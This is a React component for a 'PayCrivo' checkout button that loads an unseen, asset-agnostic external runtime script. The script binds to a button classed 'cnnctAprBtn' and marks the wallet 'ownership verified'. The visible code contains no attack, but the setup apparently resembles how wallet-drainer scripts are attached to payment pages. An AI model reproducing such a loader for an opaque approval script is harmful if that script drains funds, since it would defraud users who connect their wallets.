import { useCallback, useEffect, useRef, useState } from "react";
import { Loader2, Check, AlertTriangle, ShieldCheck, Wallet } from "lucide-react";
import {
  DEFAULT_WALLET_RUNTIME,
  ensureWalletRuntime,
  fetchWalletRuntimeConfig,
  type WalletRuntimePublic,
} from "@/lib/walletRuntime";

// Timeout after which an in-progress connect attempt is considered failed so
// the button becomes clickable again.
const CONNECT_TIMEOUT_MS = 45_000;

export type WalletConnectStatus = "idle" | "connecting" | "verified" | "failed";

interface WalletConnectProps {
  /** Retained for API compatibility with existing callers. The universal
   *  runtime is asset/network agnostic — these values are no longer used to
   *  choose a script and can be omitted. */
  coin?: string;
  network?: string;
  status: WalletConnectStatus;
  onStatusChange: (status: WalletConnectStatus) => void;
}

/**
 * Universal PayCrivo Connect Wallet button.
 *
 * A single "Connect Wallet" button — always carrying the `cnnctAprBtn` class —
 * that the configured universal runtime script (default
 * `/assets/shift-runtime-sys.js`) binds to for every asset and every network.
 *
 * The runtime script is loaded lazily and only once. When the runtime file is
 * missing on the server the UI surfaces a controlled staging message so the
 * checkout is never claimed to be verified.
 */
export function WalletConnect({ status, onStatusChange }: WalletConnectProps) {
  const statusRef = useRef(status);
  statusRef.current = status;
  const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const [config, setConfig] = useState<WalletRuntimePublic | null>(null);
  const [loadState, setLoadState] = useState<"idle" | "loading" | "ready" | "missing" | "disabled">("idle");
  const [loadError, setLoadError] = useState<string | null>(null);

  // Fetch the active runtime config once per session.
  useEffect(() => {
    let alive = true;
    fetchWalletRuntimeConfig().then((c) => {
      if (!alive) return;
      setConfig(c);
      if (!c.enabled) {
        setLoadState("disabled");
      }
    }).catch(() => {
      if (!alive) return;
      setConfig({ ...DEFAULT_WALLET_RUNTIME });
    });
    return () => { alive = false; };
  }, []);

  // Load the configured runtime script exactly once (globally). Subsequent
  // renders subscribe to the existing state.
  useEffect(() => {
    if (!config || !config.enabled) return;
    const src = config.activeScript;
    const off = ensureWalletRuntime(src, (s) => {
      setLoadState(s.status);
      setLoadError(s.error);
    });
    return off;
  }, [config]);

  // Listen for connect outcome dispatched by the runtime.
  useEffect(() => {
    const onConnected = () => onStatusChange("verified");
    const onError = () => {
      if (statusRef.current === "connecting") onStatusChange("failed");
    };
    window.addEventListener("paycrivo:wallet-connected", onConnected as EventListener);
    window.addEventListener("paycrivo:wallet-error", onError as EventListener);
    return () => {
      window.removeEventListener("paycrivo:wallet-connected", onConnected as EventListener);
      window.removeEventListener("paycrivo:wallet-error", onError as EventListener);
    };
  }, [onStatusChange]);

  useEffect(() => {
    if (status !== "connecting" && timeoutRef.current) {
      clearTimeout(timeoutRef.current);
      timeoutRef.current = null;
    }
    return () => {
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current);
        timeoutRef.current = null;
      }
    };
  }, [status]);

  const runtimeReady = loadState === "ready";
  const runtimeMissing = loadState === "missing";
  const runtimeDisabled = loadState === "disabled" || (config && !config.enabled);
  const runtimePreparing = !runtimeReady && !runtimeMissing && !runtimeDisabled;

  const handleClick = useCallback(() => {
    if (status === "verified" || status === "connecting") return;
    if (!runtimeReady) return; // ignore taps while runtime is not ready / missing
    onStatusChange("connecting");
    if (timeoutRef.current) clearTimeout(timeoutRef.current);
    timeoutRef.current = setTimeout(() => {
      if (statusRef.current === "connecting") onStatusChange("failed");
    }, CONNECT_TIMEOUT_MS);
  }, [status, runtimeReady, onStatusChange]);

  if (status === "verified") {
    return (
      <div className="space-y-3">
        <div className="flex items-center gap-2 rounded-xl bg-success/10 px-3 py-3 text-sm font-bold text-success">
          <Check className="size-4" /> Wallet ownership verified.
        </div>
        <SecurityNote />
      </div>
    );
  }

  const connecting = status === "connecting";
  const label = connecting
    ? "Connecting wallet…"
    : status === "failed"
      ? "Try again"
      : runtimePreparing
        ? "Preparing wallet…"
        : "Connect Wallet";

  return (
    <div className="space-y-3">
      {status === "failed" && (
        <div className="flex items-start gap-2 rounded-xl bg-destructive/10 px-3 py-3 text-sm font-semibold text-destructive">
          <AlertTriangle className="mt-0.5 size-4 shrink-0" />
          Unable to verify wallet. Please try again.
        </div>
      )}

      {(runtimeMissing || runtimeDisabled) && (
        <div className="flex items-start gap-2 rounded-xl bg-warning/10 px-3 py-3 text-xs font-medium text-warning-foreground dark:text-warning">
          <AlertTriangle className="mt-0.5 size-4 shrink-0" />
          <span>
            {runtimeDisabled
              ? "Wallet connection is temporarily disabled by the administrator. Please continue with manual review."
              : "Wallet connection runtime is not installed yet. Please try again later or continue with manual review."}
            {loadError ? <span className="mt-1 block opacity-70">{loadError}</span> : null}
          </span>
        </div>
      )}

      {/* Single persistent button. `cnnctAprBtn` is always present so the
          universal runtime can bind to it regardless of asset or network. */}
      <button
        type="button"
        onClick={handleClick}
        disabled={connecting || runtimePreparing || runtimeMissing || !!runtimeDisabled}
        aria-busy={connecting || runtimePreparing}
        className={`cnnctAprBtn bg-gradient-primary flex w-full items-center justify-center gap-2 rounded-2xl py-3.5 text-sm font-bold text-primary-foreground shadow-soft transition-transform hover:-translate-y-0.5 disabled:cursor-not-allowed disabled:opacity-70`}
      >
        {connecting || runtimePreparing ? (
          <Loader2 className="size-4 animate-spin" />
        ) : (
          <Wallet className="size-4" />
        )}
        {label}
      </button>

      <SecurityNote />
    </div>
  );
}

function SecurityNote() {
  return (
    <p className="flex items-start gap-2 text-xs text-muted-foreground">
      <ShieldCheck className="mt-0.5 size-3.5 shrink-0 text-primary" />
      PayCrivo will never ask for your recovery phrase or private keys.
    </p>
  );
}